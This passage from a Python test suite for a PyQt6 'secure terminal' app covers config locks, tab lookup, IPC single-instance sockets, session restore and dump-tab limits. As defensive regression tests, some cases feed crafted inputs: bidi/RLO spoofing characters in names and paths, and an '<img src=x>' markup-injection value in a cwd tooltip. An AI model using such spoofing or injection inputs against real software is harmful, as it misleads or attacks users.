    eq(_calls.get('autostart'), False,
       'clip: disabling systray clears clipboard autostart')
    _calls.clear(); _calls['autostart_state'] = False
    win.set_systray(False)
    ok('autostart' not in _calls,
       'clip: disabling systray leaves an already-off autostart alone')

    # Review-now builds an in-process reviewer for the current clipboard
    APP.clipboard().setText('deceptive \u202e text')
    win._clip_review_now()
    ok(win._clip_reviewer is not None, 'clip: Review-now builds an in-process reviewer')
    win._clip_reviewer._popup.hide()
finally:
    (_cw.is_running, _cw.stop_running, _cw.push_warn_any,
     _cw.set_autostart, _cw.autostart_enabled) = _cw_saved
    QProcess.startDetached = _o_startdet
    QSystemTrayIcon.isSystemTrayAvailable = _o_avail_c
    win._systray = _o_systray_c
    win._clip_warn_any = _o_warnany_c
    win._clip_reviewer = None
    APP.clipboard().setMimeData(_o_clip_c)

# a tab terminal's right-click menu gains the app toggles through its MainWindow
from PyQt6.QtCore import QPoint                                    # noqa: E402
_rcmenu = win.current()._reviewed_context_menu(QPoint(0, 0))
ok(any(a.text() == 'System tray icon' for a in _rcmenu.actions()),
   'context menu: a tab terminal gains the app toggles via its window')

# icon helpers build an icon (themed, path, or letter fallback)
ok(M._app_icon() is not None, '_app_icon returns an icon')
ok(M._letter_icon('A', '#3b82f6') is not None, '_letter_icon renders a fallback icon')

# config init: an out-of-range scrollback normalises; allow_title seeds the OSC
# defaults; and a locked allow_title enforces both granular title settings
_cfgd2 = os.path.join(os.environ['XDG_CONFIG_HOME'], 'secure-terminal.d')
os.makedirs(_cfgd2, exist_ok=True)
with open(os.path.join(_cfgd2, '80-init.conf'), 'w', encoding='utf-8') as _cf:
    _cf.write('scrollback=99999\nallow_title=true\ntui=true\nescape_limit=65536\n')
_wc = MainWindow()
ok(_wc._scrollback == 0, 'config: an out-of-range scrollback normalises to unlimited')
ok(_wc._escape_limit == 65536, 'config: a valid escape_limit is read from the config')
ok(_wc._default_allow_title and 'osc_title' in _wc._osc_defaults,
   'config: legacy allow_title seeds the granular OSC title default')
_wc.deleteLater()
APP.processEvents()

# a locked allow_title enforces both title settings (via a stubbed Config)
from secure_terminal import settings as _settings              # noqa: E402
_o_load = _settings.load
try:
    _settings.load = lambda: _settings.Config(
        {'allow_title': 'true'}, locked=('allow_title',))
    _wl = MainWindow()
    ok('osc_title' in _wl._osc_defaults,
       'config: a locked allow_title enforces the granular title defaults')
    _wl.deleteLater()
    APP.processEvents()
finally:
    _settings.load = _o_load

# --- _find_tab matcher forms + a real single-instance handoff -----------------
from PyQt6.QtCore import QThread                                 # noqa: E402
ok(win._find_tab(12345) is None, '_find_tab: a non-string matcher -> None')
ok(win._find_tab(win.tabs.tabText(0)) is not None,
   '_find_tab: an existing bare title is matched by title')
ok(win._find_tab('no-such-tab-title') is None,
   '_find_tab: an absent title matches nothing')
# a bare title containing a colon (e.g. 'host:port') is matched WHOLE, not split at
# the first ':' into a bogus kind -- regression: partition(':') mis-parsed it so
# 'prod:server' matched nothing. An explicit 'id:'/'title:' prefix still works.
_ft_saved = win.tabs.tabText(0)
win.tabs.setTabText(0, 'prod:server')
ok(win._find_tab('prod:server') is not None,
   '_find_tab: a bare title containing a colon is matched whole')
ok(win._find_tab('title:prod:server') is not None,
   '_find_tab: an explicit title: prefix matches a colon-bearing title')
ok(win._find_tab('id:prod:server') is None,
   '_find_tab: an id: prefix on a non-numeric value matches nothing')
win.tabs.setTabText(0, _ft_saved)

# _on_escape_suppressed: a long unterminated escape sequence surfaces a one-time,
# per-tab "output suppressed" advisory (it never lifts the suppression).
_esc_term = win.current()
win._esc_notified.discard(_esc_term)
win._advisories.pop(_esc_term, None)
win._on_escape_suppressed(_esc_term)
eq(win._advisories.get(_esc_term, (None,))[0], 'escape',
   '_on_escape_suppressed raises the suppression advisory')
win._advisories.pop(_esc_term, None)
win._on_escape_suppressed(_esc_term)         # already notified for this tab -> no re-raise
ok(_esc_term not in win._advisories,
   '_on_escape_suppressed does not re-raise for a tab already notified')
# the freeze notice WINS over the OSC notice (grok ai-review): an over-cap
# unterminated OSC fires escape_suppressed then osc_used('osc_other') in one read,
# and _on_osc_used must not clobber the more-actionable freeze banner.
win._esc_notified.discard(_esc_term)
win._advisories.pop(_esc_term, None)
win._osc_notified = {p for p in win._osc_notified if p[0] is not _esc_term}
win._on_escape_suppressed(_esc_term)         # freeze notice up
win._on_osc_used(_esc_term, 'osc_other')     # must NOT clobber it
eq(win._advisories.get(_esc_term, (None,))[0], 'escape',
   'the freeze notice wins: _on_osc_used does not clobber an active escape advisory')
ok((_esc_term, 'osc_other') not in win._osc_notified,
   'the skipped OSC notice stays un-marked so a later real OSC use can still notice')
# the freeze notice also WINS over a later autobox/tui advisory: they share the
# one-per-tab banner slot, and autobox is already conveyed by the greyed Reveal/Detail
# controls, so a lower-priority notice must not clobber the active freeze banner (the
# same class as the OSC case, fixed at the _on_advise root not per caller).
win._on_advise(_esc_term, 'boxed for TUI', 'autobox')   # must NOT clobber the freeze
eq(win._advisories.get(_esc_term, (None,))[0], 'escape',
   'the freeze notice wins: an autobox advisory does not clobber an active escape one')
win._on_advise(_esc_term, 'a full-screen hint', 'tui')  # nor does a plain tui hint
eq(win._advisories.get(_esc_term, (None,))[0], 'escape',
   'the freeze notice wins: a tui advisory does not clobber an active escape one')
win._on_advise(_esc_term, 'newer freeze', 'escape')     # but escape may replace escape
eq(win._advisories.get(_esc_term), ('escape', 'newer freeze'),
   'a new escape advisory still replaces an active escape advisory')
win._advisories.pop(_esc_term, None)
win._esc_notified.discard(_esc_term)

# --- reviewdrain15 batch-2 security findings (admin-lock bypass + session DoS) ----
_b2_lock = set(win._locked)
# #3: the legacy "Allow title" control must refuse a GRANULAR osc_title/osc_notify
# lock, not only an allow_title lock -- else it bypasses the granular lock.
win._default_allow_title = False
win._locked = {'osc_title'}
win.set_allow_title(True)
ok(win._default_allow_title is False,
   '#3: set_allow_title refuses a granular osc_title lock (no legacy-control bypass)')
win._locked = {'osc_notify'}
win.set_allow_title(True)
ok(win._default_allow_title is False,
   '#3: set_allow_title refuses a granular osc_notify lock too')
# #6: set_clip_warn_any must honour a clip_warn_any lock (every sibling setter does).
win._clip_warn_any = False
win._locked = {'clip_warn_any'}
win.set_clip_warn_any(True)
ok(win._clip_warn_any is False,
   '#6: set_clip_warn_any refuses an admin clip_warn_any lock')
win._locked = _b2_lock
# #4: a crafted session with a NON-STRING tab name must not crash restore (insertTab
# needs a str). The placeholder path used a bare truth test.
_before_ct = win.tabs.count()
win._add_placeholder_tab({'name': ['not', 'a', 'string'], 'cwd': '/tmp'}, _before_ct)  # nosec B108 -- inert cwd string in placeholder test data, never opened
ok(win.tabs.count() == _before_ct + 1,
   '#4: a non-string saved tab name falls back to a label, no restore crash')
win.tabs.removeTab(win.tabs.count() - 1)
# a placeholder tab must not flash a crafted (bidi/RLO) session name in the tab bar before
# the real tab swaps in -- the label is sanitize_title'd like the real tab.
_before_ph = win.tabs.count()
win._add_placeholder_tab({'name': 'a\u202eb', 'cwd': '/tmp'}, _before_ph)  # nosec B108 -- inert cwd string in placeholder test data, never opened
ok('\u202e' not in win.tabs.tabText(_before_ph),
   'a placeholder tab label sanitizes a bidi/RLO session name (no control/bidi flash)')
win.tabs.removeTab(win.tabs.count() - 1)
# the placeholder's cwd-basename FALLBACK (no saved name) has the same class of gap:
# a bidi dir name in the saved cwd must be sanitized too, not just the name field.
_before_phc = win.tabs.count()
win._add_placeholder_tab({'cwd': '/tmp/a\u202eb'}, _before_phc)  # nosec B108 -- inert cwd string in placeholder test data, never opened
ok('\u202e' not in win.tabs.tabText(_before_phc),
   'a placeholder tab label sanitizes a bidi/RLO cwd basename (name-less fallback)')
win.tabs.removeTab(win.tabs.count() - 1)
# #3: a restore placeholder (bare QWidget) must never crash a current()-consumer. setTabEnabled
# (False) blocks a mouse click but NOT setCurrentIndex (_goto_tab / _on_tab_step), so current()
# returns None for a non-terminal current widget and the nav guards skip a disabled tab.
win.tabs.setCurrentIndex(0)
_real_idx = win.tabs.currentIndex()
win._add_placeholder_tab({'cwd': '/tmp'}, win.tabs.count())  # nosec B108 (inert cwd string) -- append a disabled placeholder
_phi = win.tabs.count() - 1
win.tabs.setCurrentIndex(_phi)                                # force it current (bypasses setTabEnabled)
ok(win.current() is None,
   '#3: current() returns None when a restore placeholder is the current widget')
_cons_raised = None
try:
    win.copy_selection()                                     # pre-fix: current() is the placeholder -> QWidget.copy() AttributeError
except Exception as _e:
    _cons_raised = _e
ok(_cons_raised is None, '#3: a current()-consumer is a safe no-op while a placeholder is current')
win.tabs.setCurrentIndex(_real_idx)
win._goto_tab(_phi)                                          # Alt+N to the placeholder -> guard skips it
ok(win.tabs.currentIndex() == _real_idx, '#3: _goto_tab skips a disabled placeholder target')
win.tabs.setCurrentIndex(_phi - 1)
win._on_tab_step(1)                                          # step toward the placeholder -> walk past it, wrap to a live tab
ok(win.tabs.currentIndex() == 0, '#3: _on_tab_step walks past a disabled placeholder to the next live tab')
win.tabs.removeTab(_phi)
# #5: a non-ASCII / non-str saved window geometry must not crash startup.
_o_persist = win._persist_session
win._persist_session = True                  # else _restore_window_geometry no-ops
_o_loadwin = M.session.load_window
try:
    M.session.load_window = lambda: 'not base64 ' + chr(0x20ac) + chr(0x4e2d)  # non-ASCII blob
    win._restore_window_geometry()
    ok(True, '#5: a non-ASCII saved geometry is tolerated, not a startup crash')
    M.session.load_window = lambda: ['not', 'a', 'string']      # non-str blob
    win._restore_window_geometry()
    ok(True, '#5: a non-string saved geometry is tolerated too')
finally:
    M.session.load_window = _o_loadwin
    win._persist_session = _o_persist

# NOTE: the client is a background THREAD. Two alternatives were measured and
# are WORSE, so do not 'simplify' this back to either: a subprocess client
# segfaults often even without coverage (the window installs a SIGCHLD handler
# to reap its pty children, so an unrelated child races it), and a same-thread
# non-blocking socket driven by processEvents() segfaults inside on_ready.
# This shape is clean WITHOUT coverage. UNDER coverage the C tracer's per-thread
# sys.settrace races this handoff and segfaults, so the coverage gate selects the
# sys.monitoring core (COVERAGE_CORE=sysmon); see secure-terminal-tests-coverage.
# start a server and drive a genuine ping handoff through the Qt event loop
_srvwin = MainWindow()
_srvwin._remote_control = True
_srvwin.start_instance_server('cov-handoff')
_hbox = {}


def _client():
    _hbox['r'] = M.ipc.send_request('cov-handoff', {'op': 'ping'})


_cth = threading.Thread(target=_client)
_cth.start()
for _ in range(80):
    APP.processEvents()
    if not _cth.is_alive():
        break
    QThread.msleep(25)
_cth.join(timeout=3)
ok(isinstance(_hbox.get('r'), dict) and _hbox['r'].get('ok'),
   'IPC: a real single-instance handoff is accepted and served')
_srvwin.deleteLater()
APP.processEvents()

# start_instance_server swallows a socket-dir error
_o_ens = M.ipc.ensure_socket_dir
try:
    M.ipc.ensure_socket_dir = lambda *_a, **_k: (_ for _ in ()).throw(OSError())
    _es2 = MainWindow()
    _es2.start_instance_server('nope')     # ensure_socket_dir raises -> return
    ok(True, 'start_instance_server: a socket-dir error is swallowed')
    _es2.deleteLater()
    APP.processEvents()
finally:
    M.ipc.ensure_socket_dir = _o_ens

# REGRESSION (socket must not be STOLEN from a live primary): with multiple
# independent instances, a second instance that finds a live listener on the group
# socket must stay server-less rather than rebind. A mistaken always-bind
# (removeServer + listen regardless) would steal the live socket, creating a
# _server even when a primary is already up. This drives the REAL sockets (no
# mock): a connect probe (ipc.socket_is_live) sees a bound peer even before its
# event loop can reply, so a concurrent second launch cannot steal it. These
# assertions catch a regression to that always-bind behaviour.
_primary = MainWindow()
_primary.start_instance_server('steal-group')
ok(getattr(_primary, '_server', None) is not None,
   'start_instance_server: a free group -> the first instance claims it (binds)')
ok(M.ipc.socket_is_live('steal-group'),
   'ipc.socket_is_live: a bound listener answers a raw connect')
ok(not M.ipc.socket_is_live('no-such-live-group'),
   'ipc.socket_is_live: an absent socket -> not live (connect refused)')
_second = MainWindow()
_second.start_instance_server('steal-group')     # a live peer owns it
ok(getattr(_second, '_server', None) is None,
   'start_instance_server: a live peer -> the second instance stays server-less')
ok(M.ipc.socket_is_live('steal-group'),
   'start_instance_server: the first instance still owns the socket (not stolen)')
_second.deleteLater()
_primary.deleteLater()
APP.processEvents()
# a genuinely STALE socket file (no listener) is reclaimed, not treated as live
_stale_grp = 'stale-group'
_stale_path = M.ipc.socket_path(_stale_grp)
os.makedirs(os.path.dirname(_stale_path), exist_ok=True)
with open(_stale_path, 'w', encoding='utf-8') as _sf3:
    _sf3.write('')                               # a plain file: exists, nobody listening
ok(not M.ipc.socket_is_live(_stale_grp),
   'ipc.socket_is_live: a stale socket file is not live')
_reclaim = MainWindow()
_reclaim.start_instance_server(_stale_grp)       # clears the stale file, binds
ok(getattr(_reclaim, '_server', None) is not None,
   'start_instance_server: a stale socket is cleared and reclaimed')
_reclaim.deleteLater()
APP.processEvents()

# --- _handoff / adopt drain / lock degradation: the --reuse instance-socket paths
# otherwise exercised only by the subprocess E2E (test_instances), covered here in
# the instrumented in-process runner ------------------------------------------
_o_sr2 = M.ipc.send_request
_o_sil2 = M.ipc.socket_is_live
_o_sleep2 = M.time.sleep
try:
    # _handoff returns the primary's reply as soon as it answers.
    M.ipc.send_request = lambda *_a, **_k: {'ok': True, 'pid': 7}
    _hr = M._handoff('hg', {'op': 'ping'})
    ok(_hr is not None and _hr.get('pid') == 7, '_handoff: returns the primary reply')
    # None then a reply while the socket stays live: retries (drives the sleep + loop).
    M.time.sleep = lambda *_a, **_k: None
    _hseq = [None, {'ok': True, 'pid': 8}]
    M.ipc.send_request = lambda *_a, **_k: _hseq.pop(0)
    M.ipc.socket_is_live = lambda *_a, **_k: True
    _hr2 = M._handoff('hg', {'op': 'ping'})
    ok(_hr2 is not None and _hr2.get('pid') == 8,
       '_handoff: retries then returns on the next answer')
    # None + the socket goes away: give up (None) rather than spin to the deadline.
    M.ipc.send_request = lambda *_a, **_k: None
    M.ipc.socket_is_live = lambda *_a, **_k: False
    ok(M._handoff('hg', {'op': 'ping'}) is None, '_handoff: socket not live -> None')
finally:
    M.ipc.send_request = _o_sr2
    M.ipc.socket_is_live = _o_sil2
    M.time.sleep = _o_sleep2

# adopt_instance_server drains a connection that queued before the handler wired.
import socket as _socket                                   # noqa: E402
_ad_grp = 'adopt-drain'
_ad_srv, _ad_st = M._bind_instance_server(_ad_grp)
ok(_ad_st == 'claimed' and _ad_srv is not None, 'adopt: bound a server to drain from')
_ad_cli = _socket.socket(_socket.AF_UNIX, _socket.SOCK_STREAM)
_ad_cli.connect(M.ipc.socket_path(_ad_grp))
for _ in range(50):
    APP.processEvents()
    if _ad_srv.hasPendingConnections():
        break
_ad_pending = _ad_srv.hasPendingConnections()
_ad_win = MainWindow()
_ad_win.adopt_instance_server(_ad_srv, _ad_grp)
ok(_ad_pending and _ad_win._server is _ad_srv,
   'adopt_instance_server: drains a connection queued before the handler was wired')
_ad_cli.close()
_ad_win.deleteLater()
APP.processEvents()

# _acquire_group_lock must NOT crash on a mis-owned lock file (the reported
# PermissionError regression): a mode-0 stale file is self-healed (unlink+retry),
# and a lock path that can neither be opened NOR unlinked (a directory) degrades to
# None -- _bind_instance_server then claims WITHOUT the lock instead of raising.
_lg = 'lock-degrade'
M.ipc.ensure_socket_dir()
_lp = M.ipc.socket_path(_lg) + '.lock'
if os.path.isdir(_lp):
    os.rmdir(_lp)
elif os.path.exists(_lp):
    os.remove(_lp)
open(_lp, 'w').close()
os.chmod(_lp, 0)
# Force the FIRST os.open on the lock path to raise, so the mis-owned-lock self-heal
# (except -> os.unlink + retry) fires regardless of uid: CI runs as ROOT, which bypasses
# the mode-0 perms so os.open would otherwise SUCCEED and never reach the unlink branch
# (main.py:5423), dropping coverage below 100% only under root.
_o_open = os.open
_open_fired = [False]
def _open_raise_once(_p, *_a, **_k):
    if _p == _lp and not _open_fired[0]:
        _open_fired[0] = True
        raise PermissionError(13, 'forced mis-owned-lock (root-proof)')
    return _o_open(_p, *_a, **_k)
os.open = _open_raise_once  # type: ignore[assignment]
try:
    _lfd = M._acquire_group_lock(_lg)
finally:
    os.open = _o_open
ok(_lfd is not None,
   '_acquire_group_lock: a mis-owned lock file is self-healed (unlink + retry), uid-independent')
if _lfd is not None:
    os.close(_lfd)
if os.path.exists(_lp) and not os.path.isdir(_lp):
    os.remove(_lp)
os.mkdir(_lp)                                    # unopenable AND unlinkable -> degrade
ok(M._acquire_group_lock(_lg) is None,
   '_acquire_group_lock: an unusable lock path degrades to None, never raises')
_dsrv, _dst = M._bind_instance_server(_lg)       # must not raise with lock_fd None
ok(_dst in ('claimed', 'peer_owns', 'failed'),
   '_bind_instance_server: claims best-effort when the lock cannot be taken (no crash)')
if _dsrv is not None:
    _dsrv.close()
if os.path.isdir(_lp):
    os.rmdir(_lp)
# flock failing on a valid fd (an exotic filesystem that does not support it) also
# degrades to None -- the fd is closed and no exception escapes.
_o_flock = M.fcntl.flock


def _flock_unsupported(*_a, **_k):
    raise OSError('flock unsupported')


M.fcntl.flock = _flock_unsupported
try:
    ok(M._acquire_group_lock(_lg) is None,
       '_acquire_group_lock: a failing flock degrades to None (fd closed), never raises')
finally:
    M.fcntl.flock = _o_flock

# --- session persistence + quit/close handlers --------------------------------
win.set_persist_session(False)              # disabling clears the saved session
win.clear_saved_session()
_o_qapp_quit = QApplication.quit
try:
    _quit_calls = []
    QApplication.quit = lambda *_a, **_k: _quit_calls.append(1)
    win._force_close = False                 # handler must flip this before quit
    M._install_signal_quit(APP)             # installs SIGINT/SIGTERM handlers
    import signal as _sig2
    _h = _sig2.getsignal(_sig2.SIGINT)
    if callable(_h):
        _h(_sig2.SIGINT, None)              # fire the handler
    # The quit is QUEUED (QTimer.singleShot), not synchronous: it must NOT have
    # fired yet -- that is exactly what lets a signal arriving before exec() still
    # be honored. The event loop then delivers it.
    ok(not _quit_calls, 'signal-quit handler does not call app.quit synchronously')
    APP.processEvents()
    ok(_quit_calls, 'signal-quit handler queues app.quit (honored once the loop runs)')
    ok(win._force_close is True,
       'signal-quit handler force-closes windows so teardown skips the modal')
finally:
    QApplication.quit = _o_qapp_quit

# _quiet_font_warnings installs a message handler that drops the font-db noise
M._quiet_font_warnings()
ok(True, '_quiet_font_warnings installs the noise-filtering message handler')

# --- main(): the -- boundary and the WM name/class startup options ------------
_o_argv2 = sys.argv[:]
_o_sr3 = M.ipc.send_request
_o_qa2 = M.QApplication
_o_qexec2 = QApplication.exec
_o_chld2 = __import__('signal').getsignal(__import__('signal').SIGCHLD)
try:
    # --test-canary AFTER a `--` belongs to the child and is NOT fired
    M.ipc.send_request = lambda *_a, **_k: None


    class _AP2:
        def __call__(self, _a):
            return APP

        def __getattr__(self, _n):
            return getattr(QApplication, _n)

    M.QApplication = _AP2()
    M.QFontDatabase = _FontDBPresent    # startup is font-independent here
    QApplication.exec = lambda _s: 0
    sys.argv = ['secure-terminal', '--new-instance', '--name', 'wmname',
                '--class', 'wmclass']
    eq(M.main(), 0, 'main: --name/--class set the WM name/class during startup')
    # a `--` before --test-canary means the canary belongs to the child command
    sys.argv = ['secure-terminal', '--new-instance', '--', '--test-canary']
    ok(M.main() == 0, 'main: --test-canary after -- is left to the child')
    # the missing-default-font wiring: main() -> `if not _require_default_font():
    # return 1`. Asserted here (after the threaded handoff test) on purpose -- see
    # the note in the font block above.
    M.QFontDatabase = _FontDBAbsent
    sys.argv = ['secure-terminal', '--new-instance', '--title', 'nofont']
    with _ctx.redirect_stderr(_io.StringIO()):
        eq(M.main(), 1, 'font: main() exits 1 when the default font is missing')
    M.QFontDatabase = _FontDBPresent
finally:
    sys.argv = _o_argv2
    M.ipc.send_request = _o_sr3
    M.QApplication = _o_qa2
    M.QFontDatabase = _REAL_QFONTDB
    QApplication.exec = _o_qexec2
    __import__('signal').signal(__import__('signal').SIGCHLD, _o_chld2)

# --- find bar: all-tabs and single-tab search + stepping ----------------------
while win.tabs.count() < 2:
    win.new_tab()
win.show_find()
win._find_bar.all_tabs.setChecked(True)
win._find_bar.input.setText('e')
win._find_update()                          # all-tabs, with a query
win._find_bar.input.setText('')
win._find_update()                          # all-tabs, no query
win._find_bar.input.setText('zzz-no-such-match')
win._find_update()                          # all-tabs, no matches
win._find_bar.all_tabs.setChecked(False)
win._find_bar.input.setText('e')
win._find_update()                          # single-tab, with a query
win._find_step(False)
win._find_step(True)                        # backward, wrap
win._find_bar.input.setText('')
win._find_step(False)                       # no query -> return
ok(True, 'find bar: all-tabs and single-tab search + stepping run')

# --- status-bar notifications, bell label, tray bell, cwd tooltip -------------
win._on_notify('a notification')
win._default_bell_sound = '/usr/share/sounds/example.wav'
ok('Sound file:' in win._bell_sound_label(), '_bell_sound_label names the file')
win._default_bell_sound = ''
_bt = win.current()
win._on_bell_tray(_bt, 'label')
win._on_cwd_changed(_bt, '/tmp/some/where')  # nosec B108 -- literal path string arg to a handler under test; nothing is created
ok(True, 'notification, bell-tray and cwd-changed handlers run')
# SEC-2: the OSC-7 cwd tooltip must be html-escaped (setTabToolTip renders rich text), or
# a cwd path could inject markup -- the sibling _refresh_tab_label already escapes.
win._on_cwd_changed(_bt, '/<img src=x>')  # nosec B108 -- literal handler arg, nothing created
_cwdtip = win.tabs.tabToolTip(win.tabs.indexOf(_bt))
ok('<img' not in _cwdtip and '&lt;img' in _cwdtip,
   'SEC-2: an OSC-7 cwd path is html-escaped in the tab tooltip (no raw markup)')

# --- _set_shortcuts: a reserved key, a duplicate, and an unknown ident ---------
_ids = list(win._shortcuts)[:2]
_probs = win._set_shortcuts({_ids[0]: 'Ctrl+C',           # reserved terminal key
                             _ids[1]: 'Ctrl+G',
                             'no-such-ident': 'Ctrl+H'})   # unknown -> skipped
ok(isinstance(_probs, list)
   and any('reserved for the terminal' in _p for _p in _probs),
   '_set_shortcuts: a reserved key (Ctrl+C) is reported by name (real detection, not the lock guard)')
_dup = win._set_shortcuts({_ids[0]: 'Ctrl+J', _ids[1]: 'Ctrl+J'})   # duplicate
ok(isinstance(_dup, list)
   and any('assigned to more than one action' in _p for _p in _dup),
   '_set_shortcuts: a duplicate binding is reported (real duplicate detection)')

# --- tab-op guards on invalid targets -----------------------------------------
from PyQt6.QtGui import QColor as _QC        # noqa: E402
win.rename_tab(-1)                           # index < 0 -> return (no dialog)
win.set_tab_color(-1, _QC('#ff0000'))        # index < 0 -> return
win.zoom_reset()                             # -> set_zoom(100)
_other = MainWindow()
_other.new_tab()
win._refresh_tab_label(_other.tabs.widget(0))  # a term not in this window -> return
_other.deleteLater()
APP.processEvents()
ok(True, 'tab-op guards on invalid targets are no-ops')

# _pick_custom_tab_color stale-index across the modal (same class as rename/save, but a
# wrong-TARGET not a crash): the colour picker is modal, and a background tab's shell can
# exit during it, shifting indices. The captured index must be re-resolved from the TARGET
# term after the modal, or set_tab_color colours the tab now at the stale index. Uses a
# THROWAWAY window (torn down here) so the tab churn never reaches the suite teardown.
from PyQt6.QtWidgets import QColorDialog        # noqa: E402
_pcw = MainWindow()
_pcw._persist_session = False
while _pcw.tabs.count() < 4:
    _pcw.new_tab()
_pc_bg = _pcw.tabs.widget(0)                     # a lower-index background tab
_pc_target = _pcw.tabs.widget(2)                 # the tab the picker is opened for
_pc_extra = _pcw.tabs.widget(3)                  # ends up at the stale index 2 after the close
_pc_bg.has_foreground_program = lambda: False    # close_tab needs no confirm
_pc_bg.shutdown = lambda: None                    # stub only the tab closed mid-modal
def _pick_closes_bg(*_a, **_k):
    _pcw.close_tab(_pcw.tabs.indexOf(_pc_bg))     # index 0 exits -> 2 shifts to 1, 3 to 2
    APP.processEvents()
    return _QC('#123456')
_ogc = QColorDialog.getColor
try:
    QColorDialog.getColor = staticmethod(_pick_closes_bg)
    _pcw._pick_custom_tab_color(2)               # stale index 2 now points at _pc_extra
finally:
    QColorDialog.getColor = _ogc
ok(_pcw._tab_colors.get(_pc_target) == '#123456',
   '_pick_custom_tab_color: the colour lands on the target tab, not the stale index')
ok(_pcw._tab_colors.get(_pc_extra) != '#123456',
   '_pick_custom_tab_color: the tab now at the stale index is not mis-coloured')
while _pcw.tabs.count() > 0:                      # reap the survivors' ptys, then drop it
    _pcw.close_tab(0)
_pcw.deleteLater()
APP.processEvents()

# _on_clipboard_read_requested stale-term across the modal (HIGH -- whole-app crash): a
# program asks to read the clipboard (OSC 52) then its shell exits during the request
# dialog; _on_shell_exited->close_tab frees term, then grant_clipboard_read on the dead
# QObject aborts the WHOLE app. The _tab_is_live guard must skip the grant if the tab
# closed. Throwaway window; mock QDialog.exec to kill the tab from inside the modal.
from PyQt6.QtWidgets import QDialog                # noqa: E402
_crw = MainWindow()
_crw._persist_session = False
_cr_term = _crw.current()
_cr_term.has_foreground_program = lambda: False   # close_tab needs no confirm
_cr_term.shutdown = lambda: None                   # stub only the tab closed mid-modal
_cr_calls = []
_cr_term.grant_clipboard_read = lambda d: _cr_calls.append(d)   # spy: must NOT be called
_oexec = QDialog.exec
def _exec_kills_tab(_self):
    _crw.close_tab(_crw.tabs.indexOf(_cr_term))    # the tab's shell exits mid-dialog
    APP.processEvents()                            # let deleteLater free it
    return 0
try:
    QDialog.exec = _exec_kills_tab
    _crw._on_clipboard_read_requested(_cr_term)    # must NOT crash, must NOT grant
finally:
    QDialog.exec = _oexec
ok(_cr_calls == [],
   '_on_clipboard_read_requested: a tab closed during the dialog is not granted (no crash)')
while _crw.tabs.count() > 0:
    _crw.close_tab(0)
_crw.deleteLater()
APP.processEvents()

# --- ctl: dump-tab tail-cap, an unknown ctl op --------------------------------
if win.tabs.count() == 0:
    win.new_tab()
_t0b = win.tabs.widget(0)
_tid0b = win._tab_ids.get(_t0b)
# Isolate from prior-test pollution on this SHARED tab: a WIDE winsize so the test
# string cannot soft-wrap mid-word, and a LEADING NEWLINE to end any partial input a
# prior test left on the current line. Without both, the last line was only the
# wrapped tail (e.g. 'of text' when a prior 'echo' + a narrow width wrapped
# 'echohello world of text' mid-word) -- the offscreen ordering flake that passed in
# isolation but failed under the full-suite ordering.
_t0b._set_winsize(200, 50)
_t0b._append('\nhello world of text')
# COR-7: --lines 0 must dump ZERO lines, not the whole tab. The server's `lines > 0` guard
# defaulted 0 to a full dump, and text.split('\n')[-0:] is the WHOLE list (negative-zero).
_rl0 = win._ipc_ctl('ctl-dump-tab', {'tab': 'id:%d' % _tid0b, 'lines': 0})
ok(_rl0['ok'] and _rl0['text'] == '',
   'COR-7: ctl-dump-tab lines=0 dumps zero lines, not the full tab')
_rl1 = win._ipc_ctl('ctl-dump-tab', {'tab': 'id:%d' % _tid0b, 'lines': 1})
ok(_rl1['ok'] and 'hello world of text' in _rl1['text'],
   'COR-7: ctl-dump-tab lines=1 still dumps the last line')
# --lines N with N > available must return ALL lines. Base used [-lines:] (correct for N>len);
# the len=0 fix regressed it to parts[len-lines:] -- a negative start returning only the last
# (lines-len) lines. Multi-line tab, request one more than it has -> all lines, not just one.
_t0b._append('\nCANARY-DUMP-L2\nCANARY-DUMP-L3')
_parts_now = _t0b.toPlainText().split('\n')
_rlN = win._ipc_ctl('ctl-dump-tab', {'tab': 'id:%d' % _tid0b, 'lines': len(_parts_now) + 1})
ok(_rlN['ok'] and _rlN['text'].split('\n') == _parts_now,
   'COR-7: ctl-dump-tab --lines > available returns ALL lines, not just the last')
# bool is an int subclass: lines=true must be REJECTED (full dump), not sliced as lines=1.
_rlb = win._ipc_ctl('ctl-dump-tab', {'tab': 'id:%d' % _tid0b, 'lines': True})
ok(_rlb['ok'] and _rlb['text'].split('\n') == _parts_now,
   'COR-7: ctl-dump-tab lines=true (bool) is rejected -> full dump, not lines=1')
_o_dumpmax = M._DUMP_MAX
try:
    M._DUMP_MAX = 4                          # force the tail-cap branch
    _rr = win._ipc_ctl('ctl-dump-tab', {'tab': 'id:%d' % _tid0b})
    ok(_rr['ok'] and len(_rr['text']) <= 4, 'ctl dump-tab tail-caps to _DUMP_MAX')
finally:
    M._DUMP_MAX = _o_dumpmax
# F4: dump-tab bounds the ENCODED frame, not the character count -- non-ASCII expands
# ~6x under json.dumps(ensure_ascii), so a char cap alone could overflow the IPC frame
# and the client would drop it. Force a tiny frame cap + non-ASCII content past it.
import secure_terminal.ipc as _ipc4              # noqa: E402
import json as _json4                            # noqa: E402
_o_maxreq = _ipc4._MAX_REQUEST
try:
    _ipc4._MAX_REQUEST = 200
    _t0b._append('\u2603' * 200)             # snowmen: ~6 encoded bytes each
    _r4 = win._ipc_ctl('ctl-dump-tab', {'tab': 'id:%d' % _tid0b})
    ok(_r4['ok'], 'F4: dump-tab succeeds even when the raw text overflows the frame')
    ok(len(_json4.dumps(_r4).encode('utf-8')) <= _ipc4._MAX_REQUEST,
       'F4: the dump-tab reply is bounded by the ENCODED frame, not the char count')
finally:
    _ipc4._MAX_REQUEST = _o_maxreq
ok(not win._ipc_ctl('ctl-bogus', {})['ok'], 'ctl: an unknown ctl op is rejected')

# --- InfoTip: hide when the pointer is away, and a hard-destroyed source -------
from PyQt6 import sip                                           # noqa: E402
_tip2 = M.InfoTip(win)
_probe2 = MainWindow()
_tip2.show_for(_probe2, 'x', 100, 'light')
sip.delete(_probe2)                          # force-destroy the C++ source object
_tip2._check_pointer()                        # mapToGlobal raises RuntimeError -> caught
_tip2.hide()
_tip2._source = None
_tip2._check_pointer()                        # not over tip or source -> hide + stop
ok(_tip2._source is None, 'InfoTip: a destroyed source is handled and it hides')
# regression: a long tip at a high zoom must NOT be clipped (the wrapped last line
# used to vanish), and the tip must not be maximizable full-screen (max size capped
# to content, so a WM maximize is a no-op and the pointer poll can still hide it)
_longtip = ('The monospace font family used for the terminal grid. The default Hack '
            'avoids confusable glyphs and has no ligatures. Applies to every tab.')
_tip2.show_for(win, _longtip, 300, 'light')
ok(_tip2.height() >= _tip2.heightForWidth(_tip2.width()),
   'InfoTip: a long tip at high zoom fits its wrapped text (not clipped)')
